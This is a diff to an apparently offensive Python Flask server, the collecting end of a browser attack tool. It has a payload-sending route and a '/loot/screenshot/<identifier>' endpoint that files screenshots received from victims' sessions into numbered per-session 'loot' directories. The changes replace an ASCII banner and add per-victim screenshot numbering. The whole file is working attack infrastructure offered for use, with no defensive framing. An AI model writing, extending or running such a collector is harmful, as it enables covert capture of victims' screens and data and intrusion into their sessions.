@@ -16,29 +16,31 @@ def printHeader():
                                       █▌█▌▪▐█ ▀. ▐█ ▀. 
                                       ·██· ▄▀▀▀█▄▄▀▀▀█▄
                                      ▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
-                                     •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀                                                                                                                    
-                                                             ,/,@ ...          
-              ....,,*,.                                 .&@( .@&%.   @         
-               ,@@/ ,#@@@@@&*    .*(%@@@@%/.        %@@@@#         &*          
-                   .&@@#.    /&@@@@@%,          ./%@@@@@@@@@@.   &(            
-                        .@@@@@/      ,&@@@@@(          *@@@@@@@@&              
-                              %@@@@@@@@/    .&@@@@@*       %@@@.               
-                            ,@@@@@@@@@(&@.,(%%%#.  /&@@@@#.   &@(              
-                           &@@@@@@ *@@@@@@@% ,@,   (      /@@@@( /@@.          
-                          @@@@@@@@@@@@@@@@ /#           *#      *&@@@@@/       
-                       .@@@,   .@@@@@@@@@/        ,(/   @@@@@&/      .@@@@%    
-                    /@@@,     ,@@@@@&,    /,  (.#&%/.*(@@@@@*@@@@@@@@%,   &@@, 
-                 %@@@,                         ..*#@@@@@/     (@@#   ./&@@@@@@@
-              &@@@.                     *&@@@@@@@#@@@           @@@           
-          .@@@&               ./%@@@@@@&/.        @@@            #@@,          
-       ,@@@%        *#&@@@@@@@(.                  @@@             *@@(         
-    *@@@/,(&@@@@@@@&(.                            @@@              .@@%       
- ,@@@@@@@%*.                                      @@#               *@@%       
-                                                 &@@.                &@@.      
-                                                #@@/                  @@@      
-                                               @@@,                   *@@(     
-                                             &@@%                      &@@,    
-                                          ,@@@(                         @@@                                                               
+                                     •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀           
+                                                    .                                                                
+             .* ./,                                                             
+             ,    ,,,                                                           
+            *     .,.*                                                          
+           ,*      ,. *.                                      .(/,#/            
+           *        *  *,         .,,.                      ,#%&&&&#            
+          ./        ,,  /.          ./#%%&&&&&&&&&&&&%#((//,  ,#%%#/*           
+          *,        .*  .(,               ,/#%%&&&&&&&&&&&&&#,   ,   ,.         
+          #,         *.  ,(                    .*#%&&&&&&&&&&&%#*     *         
+         ,#          .,   /,                  ./(#(  ,*#%%&&&&&&&&(. ,.         
+         ,/          .*   ,/                 *%%#(%%%%(   .*(%%%%%&#(,          
+ ./*.  ../(,,*******/,/.  ,%/////.         .(*  ,%%%%/     */  ...,%%%%/.       
+ *.                 *//   ,#     *.       /,          .***,(.,/    , ,(###*     
+ ,,.*,,*/(##((/*/***///   (*....,(.     *,           .*/(%%%(,(*..*.      .*/.  
+          #,     .,, /*  */..(*,      ,,       .,/(/,(%%&&&&&&&&%%%/.           
+          **         /. ,/  ,,*,    ,,    ,//,       */%%%%%&&&&&&%%%#*         
+          .(        */ .*  .*,, , .***,.             *(/%%%%%((#%%%%%%%%#*      
+           /       .(,**  *.*,. .,                   *%((%%&%&(#&%&#%%&%%%%(,   
+           */      /(/, .*.(.     ,*,               .#%%//%%%&(%&&&(%&&&&&&&&%* 
+            (,    *%/.  ,.**... ,..(%%(,           .(%%%#*#%&#(&&%#/&&&&&&&&&&%#
+            ./   ,(, ** ..  *,,/**%%&&&%%%#/,,..  *#%%%%* *%#*%&&%((&&&&&&&&&&&&
+             ,/.*,    *%(.  .  , .*#%%%%%%%&&&&/(/#%%%#,  .##%&&&%/%&&&&&&&&&&&&
+                     .((/,....         ,/##%%%%&&%&%%(.    *%&&&%/%&&&&&&&&&&&&&                                                                                                         
+                                                            
                                      ▄▄▄▄▄ ▄▄▄·  ▄▄▄·
                                      •██  ▐█ ▀█ ▐█ ▄█
                                       ▐█.▪▄█▀▀█  ██▀·
@@ -49,8 +51,9 @@ def printHeader():
 
 
 #***************************************************************************
-# Support Types
+# Support Data
 SessionDirectories = {}
+SessionImages = {}
 lootDirCounter = 1
 
 
@@ -70,13 +73,15 @@ def findLootDirectory(identifier):
     global lootDirCounter
 
     if identifier in SessionDirectories.keys():
-        print("We know this session!")
+        print("We already have this session")
     else:
         print("New session!")
+        # Initialize or storage
         SessionDirectories[identifier] = lootDirCounter
         lootDirCounter = lootDirCounter + 1
         lootPath = './loot/' + str(SessionDirectories[identifier])
         print("Checking if loot dir exists: " + lootPath)
+
         if not os.path.exists(lootPath):
             print("Creating directory...")
             os.mkdir(lootPath)
@@ -86,6 +91,9 @@ def findLootDirectory(identifier):
             sessionFile.close()
         else:
             print("Loot directory already exists")
+
+        # Initialize our screenshot number tracker
+        SessionImages[identifier] = 1;
 
     lootDir = SessionDirectories[identifier]
     print("Loot directory is: " + str(lootDir))
@@ -116,11 +124,19 @@ def sendPayload():
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
 def recordScreenshot(identifier):
     print("Received image from: " + identifier)
-    print("Looking up loot dir...")
+    #print("Looking up loot dir...")
     lootDir = findLootDirectory(identifier)
     image = request.data
+
+    if identifier in SessionImages.keys():
+        imageNumber = SessionImages[identifier]
+        print("Using image number: " + str(imageNumber))
+        SessionImages[identifier] = imageNumber + 1
+    else:
+        raise RuntimeError("Session image counter not found")
+
     print("Writing the file to disk...")
-    with open ("./loot/" + lootDir + "/tmpScreenshot.png", "wb") as binary_file:
+    with open ("./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
         binary_file.write(image)
         binary_file.close()
 
